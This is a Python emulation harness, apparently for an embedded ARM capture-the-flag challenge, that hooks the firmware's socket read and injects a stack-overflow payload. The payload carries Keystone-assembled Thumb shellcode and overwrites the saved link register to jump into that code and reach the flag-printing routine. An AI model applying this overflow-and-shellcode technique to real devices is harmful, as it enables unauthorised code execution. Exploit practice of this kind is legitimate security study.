import logging
from unicorn import *
from unicorn.unicorn_const import *
from unicorn.x86_const import *
from unicorn.arm_const import *
from unicorn.arm64_const import *
from pwn import *
from keystone import *
from capstone import *

rdlog = logging.getLogger("RDLog")


class RDHooks:
    def __init__(self, uc):
        uc.hook_add(UC_HOOK_MEM_READ_UNMAPPED | UC_HOOK_MEM_WRITE_UNMAPPED
                    | UC_HOOK_MEM_FETCH_INVALID, RDHooks.hook_mem_invalid)
        uc.hook_add(UC_HOOK_MEM_READ | UC_HOOK_MEM_WRITE,
                    RDHooks.hook_mem_access)
        uc.hook_add(UC_HOOK_CODE, RDHooks.hook_code)

    @staticmethod
    def hook_mem_invalid(uc, access, address, size, value, user_data):
        if access == UC_MEM_WRITE_UNMAPPED:
            rdlog.error(
                'write operation to unmapped memory at address 0x{address:x}'.
                format(address=address))
        elif access == UC_MEM_READ_UNMAPPED:
            rdlog.error(
                'read operation from unmapped memory at address 0x{address:x}'.
                format(address=address))
        elif UC_MEM_FETCH_UNMAPPED:
            rdlog.error(
                'fetch operation from unmapped memory at address 0x{address:x}'.
                format(address=address))
        # return False to indicate we want to stop emulation
        return False

    @staticmethod
    def hook_mem_access(uc, access, address, size, value, user_data):
        pass

    @staticmethod
    def hook_code(uc, address, size, user_data):
        cs = Cs(CS_ARCH_ARM, CS_MODE_THUMB)
        code = uc.mem_read(address, 4)
        instr = next(cs.disasm(code, address))
        #print("pc at 0x{:08x} \t {:s} \t {:s} {:s}".format(address, code.hex(), instr.mnemonic, instr.op_str))

        # skip the _init_array_start calls
        if address == 0x08000636:
            r5 = uc.reg_read(UC_ARM_REG_R5)
            uc.reg_write(UC_ARM_REG_R4, r5)

        # show stack pointer after having pushed r4 and lr in handle_client
        if address == 0x080004E8:
            sp = uc.reg_read(UC_ARM_REG_SP)
            print("stack pointer when entering handle_client 0x{:08x}".format(sp))
            data = uc.mem_read(sp, 4)
            data = int.from_bytes(data, 'little')
            print("data at stack pointer 0x{:08x}".format(data))

        # show saved lr before call to socket_t::read_avail
        if address == 0x08000514:
            sp = uc.reg_read(UC_ARM_REG_SP)
            saved_lr = uc.mem_read(sp + 0x324, 4)
            saved_lr = int.from_bytes(saved_lr, 'little')
            print("saved lr before socket_t::read_avail 0x{:08x}".format(saved_lr))

        # emulate socket_t::read_avail
        if address == 0x08001018:
            #payload = b'a' * (0x304)
            #payload += p32(0x80006e7)
            #payload += b'\r\n'

            sp = 0x20001fd4  # value of sp when entering/exiting handle_client

            shellcode_txt = """
            # r0 = sp
            mov r0, #0x{socket_addr_lsb:x};
            movt r0, #0x{socket_addr_msb:x};

            # r1 = *0x20000010 (w5500)
            mov r1, #0x0010;
            movt r1, #0x2000;
            ldr r1, [r1];

            # r2 = 0
            mov r2, #0;

            # r3 = 0x08000caf (socket_t::socket_t)
            mov r3, #0x0caf;
            movt r3, #0x0800;

            # call socket_t::socket_t
            blx r3;

            # set up socket_t object in r4
            mov r4, r0;

            # r3 = 0x0800040b (right before printing the flag)
            mov r3, #0x040b;
            movt r3, #0x0800;

            # gogogo
            blx r3
            """.format(socket_addr_lsb=sp & 0xffff,
                       socket_addr_msb=((sp & 0xffff0000) >> 16))

            sc_addr = sp # start with the sp value
            sc_addr -= 0x300 # start of the stack buffer
            sc_addr += 8 * 2 # the b'a ' part of the payload
            sc_addr += 1 # thumb

            ks = Ks(KS_ARCH_ARM, KS_MODE_THUMB)
            shellcode_bin, _ = ks.asm(shellcode_txt, addr=sc_addr)

            payload = b'a ' * 8
            payload += bytes(shellcode_bin)
            payload += b'a' * (0x304 - 2 * 8 - len(shellcode_bin))
            payload += p32(sc_addr)  # overwrite saved lr

            r1 = uc.reg_read(UC_ARM_REG_R1)
            uc.mem_write(r1, payload)
            uc.reg_write(UC_ARM_REG_R0, len(payload))

        # show saved lr after call to socket_t::read_avail
        if address == 0x08000518:
            sp = uc.reg_read(UC_ARM_REG_SP)
            saved_lr = uc.mem_read(sp + 0x324, 4)
            saved_lr = int.from_bytes(saved_lr, 'little')
            print("saved lr after socket_t::read_avail 0x{:08x}".format(saved_lr))

        # show saved lr after call to parse_args
        if address == 0x08000524:
            sp = uc.reg_read(UC_ARM_REG_SP)
            saved_lr = uc.mem_read(sp + 0x324, 4)
            saved_lr = int.from_bytes(saved_lr, 'little')
            print("saved lr after parse_args 0x{:08x}".format(saved_lr))

        if address == 0x08000532:
            sp = uc.reg_read(UC_ARM_REG_SP)
            data = uc.mem_read(sp, 8)
            w1 = int.from_bytes(data[:3], 'little')
            w2 = int.from_bytes(data[4:], 'little')
            print("stack values right before final pop 0x{:08x} 0x{:08x}".format(w1, w2))

    @staticmethod
    def hook_block(uc, address, size, user_data):
        pass

    @staticmethod
    def hook_pre_run(uc, iteration):
        pass

    @staticmethod
    def hook_post_run(uc):
        pass
